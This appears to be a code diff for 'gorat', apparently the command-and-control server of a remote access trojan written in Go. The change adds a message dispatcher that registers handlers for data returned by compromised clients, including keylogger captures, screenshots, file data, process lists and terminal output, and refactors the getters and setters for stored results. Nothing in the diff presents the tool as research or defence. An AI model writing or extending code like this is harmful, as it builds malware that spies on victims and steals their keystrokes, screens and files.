@@ -12,6 +12,7 @@ import (
 
 	"gorat/common"
 	"gorat/pkg/auth"
+	"gorat/pkg/messaging"
 	"gorat/pkg/storage"
 
 	"github.com/gin-gonic/gin"
@@ -35,6 +36,7 @@ type Server struct {
 	webHandler         *WebHandler
 	terminalProxy      *TerminalProxy
 	proxyManager       *ProxyManager
+	dispatcher         messaging.Dispatcher
 	commandResults     map[string]*common.CommandResultPayload
 	fileListResults    map[string]*common.FileListPayload
 	driveListResults   map[string]*common.DriveListPayload
@@ -93,6 +95,7 @@ func NewServer(config *Config) *Server {
 		authenticator:      NewAuthenticator(config.AuthToken),
 		webHandler:         webHandler,
 		terminalProxy:      terminalProxy,
+		dispatcher:         messaging.NewDispatcher(),
 		commandResults:     make(map[string]*common.CommandResultPayload),
 		fileListResults:    make(map[string]*common.FileListPayload),
 		driveListResults:   make(map[string]*common.DriveListPayload),
@@ -102,6 +105,9 @@ func NewServer(config *Config) *Server {
 		systemInfoResults:  make(map[string]*common.SystemInfoPayload),
 	}
 
+	// Initialize message dispatcher with handlers
+	server.initializeDispatcher()
+
 	// Set server reference in web handler
 	webHandler.server = server
 
@@ -109,6 +115,24 @@ func NewServer(config *Config) *Server {
 	manager.SetStore(store)
 
 	return server
+}
+
+// initializeDispatcher sets up message handlers for the dispatcher
+func (s *Server) initializeDispatcher() {
+	// Register standard message handlers
+	s.dispatcher.Register(messaging.NewHeartbeatHandler(s))
+	s.dispatcher.Register(messaging.NewCommandResultHandler(s))
+	s.dispatcher.Register(messaging.NewFileListHandler(s))
+	s.dispatcher.Register(messaging.NewDriveListHandler(s))
+	s.dispatcher.Register(messaging.NewProcessListHandler(s))
+	s.dispatcher.Register(messaging.NewSystemInfoHandler(s))
+	s.dispatcher.Register(messaging.NewFileDataHandler(s))
+	s.dispatcher.Register(messaging.NewScreenshotDataHandler(s))
+	s.dispatcher.Register(messaging.NewKeyloggerDataHandler())
+	s.dispatcher.Register(messaging.NewUpdateStatusHandler())
+	s.dispatcher.Register(messaging.NewTerminalOutputHandler(s.terminalProxy.HandleTerminalOutput))
+	s.dispatcher.Register(messaging.NewPongHandler())
+	log.Println("Message dispatcher initialized with all handlers")
 }
 
 // NewServerWithRecovery creates a new server with error recovery
@@ -819,12 +843,32 @@ func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(map[string]string{"status": "sent"})
 }
 
-// GetFileListResult retrieves stored file list result for a client
-func (s *Server) GetFileListResult(clientID string) (*common.FileListPayload, bool) {
+// GetCommandResult retrieves stored command result for a client
+func (s *Server) GetCommandResult(clientID string) *common.CommandResultPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
-	result, exists := s.fileListResults[clientID]
-	return result, exists
+	return s.commandResults[clientID]
+}
+
+// SetCommandResult stores command result for a client
+func (s *Server) SetCommandResult(clientID string, payload *common.CommandResultPayload) {
+	s.resultsMu.Lock()
+	defer s.resultsMu.Unlock()
+	s.commandResults[clientID] = payload
+}
+
+// GetFileListResult retrieves stored file list result for a client
+func (s *Server) GetFileListResult(clientID string) *common.FileListPayload {
+	s.resultsMu.RLock()
+	defer s.resultsMu.RUnlock()
+	return s.fileListResults[clientID]
+}
+
+// SetFileListResult stores file list result for a client
+func (s *Server) SetFileListResult(clientID string, payload *common.FileListPayload) {
+	s.resultsMu.Lock()
+	defer s.resultsMu.Unlock()
+	s.fileListResults[clientID] = payload
 }
 
 // ClearFileListResult removes stored file list result
@@ -835,11 +879,17 @@ func (s *Server) ClearFileListResult(clientID string) {
 }
 
 // GetDriveListResult retrieves stored drive list result for a client
-func (s *Server) GetDriveListResult(clientID string) (*common.DriveListPayload, bool) {
+func (s *Server) GetDriveListResult(clientID string) *common.DriveListPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
-	result, exists := s.driveListResults[clientID]
-	return result, exists
+	return s.driveListResults[clientID]
+}
+
+// SetDriveListResult stores drive list result for a client
+func (s *Server) SetDriveListResult(clientID string, payload *common.DriveListPayload) {
+	s.resultsMu.Lock()
+	defer s.resultsMu.Unlock()
+	s.driveListResults[clientID] = payload
 }
 
 // ClearDriveListResult removes stored drive list result
@@ -850,11 +900,17 @@ func (s *Server) ClearDriveListResult(clientID string) {
 }
 
 // GetScreenshotResult retrieves stored screenshot result for a client
-func (s *Server) GetScreenshotResult(clientID string) (*common.ScreenshotDataPayload, bool) {
+func (s *Server) GetScreenshotResult(clientID string) *common.ScreenshotDataPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
-	result, exists := s.screenshotResults[clientID]
-	return result, exists
+	return s.screenshotResults[clientID]
+}
+
+// SetScreenshotResult stores screenshot result for a client
+func (s *Server) SetScreenshotResult(clientID string, payload *common.ScreenshotDataPayload) {
+	s.resultsMu.Lock()
+	defer s.resultsMu.Unlock()
+	s.screenshotResults[clientID] = payload
 }
 
 // ClearScreenshotResult removes stored screenshot result
@@ -865,11 +921,17 @@ func (s *Server) ClearScreenshotResult(clientID string) {
 }
 
 // GetFileDataResult retrieves stored file data result for a client
-func (s *Server) GetFileDataResult(clientID string) (*common.FileDataPayload, bool) {
+func (s *Server) GetFileDataResult(clientID string) *common.FileDataPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
-	result, exists := s.fileDataResults[clientID]
-	return result, exists
+	return s.fileDataResults[clientID]
+}
+
+// SetFileDataResult stores file data result for a client
+func (s *Server) SetFileDataResult(clientID string, payload *common.FileDataPayload) {
+	s.resultsMu.Lock()
+	defer s.resultsMu.Unlock()
+	s.fileDataResults[clientID] = payload
 }
 
 // ClearFileDataResult removes stored file data result
@@ -880,14 +942,11 @@ func (s *Server) ClearFileDataResult(clientID string) {
 }
 
 // GetProcessListResult retrieves stored process list result for a client
-func (s *Server) GetProcessListResult(clientID string) (*common.ProcessListPayload, bool) {
+func (s *Server) GetProcessListResult(clientID string) *common.ProcessListPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
-	result, exists := s.processListResults[clientID]
-	return result, exists
-}
-
-// SetProcessListResult stores process list result for a client
+	return s.processListResults[clientID]
+} // SetProcessListResult stores process list result for a client
 func (s *Server) SetProcessListResult(clientID string, payload *common.ProcessListPayload) {
 	s.resultsMu.Lock()
 	defer s.resultsMu.Unlock()
@@ -902,11 +961,10 @@ func (s *Server) ClearProcessListResult(clientID string) {
 }
 
 // GetSystemInfoResult retrieves stored system info result for a client
-func (s *Server) GetSystemInfoResult(clientID string) (*common.SystemInfoPayload, bool) {
+func (s *Server) GetSystemInfoResult(clientID string) *common.SystemInfoPayload {
 	s.resultsMu.RLock()
 	defer s.resultsMu.RUnlock()
-	result, exists := s.systemInfoResults[clientID]
-	return result, exists
+	return s.systemInfoResults[clientID]
 }
 
 // SetSystemInfoResult stores system info result for a client
@@ -1066,4 +1124,10 @@ func (s *Server) loadSavedProxies() {
 
 	log.Printf("Proxy restore complete: %d restored, %d skipped/failed", successCount, failCount)
 	log.Printf("Note: Proxies will be auto-restored when their clients reconnect")
+}
+
+// UpdateClientMetadata implements messaging.ClientMetadataUpdater
+func (s *Server) UpdateClientMetadata(clientID string, fn func(*common.ClientMetadata)) {
+	// Ignore error - client may not exist yet, which is fine for heartbeat updates
+	_ = s.manager.UpdateClientMetadata(clientID, fn)
 }
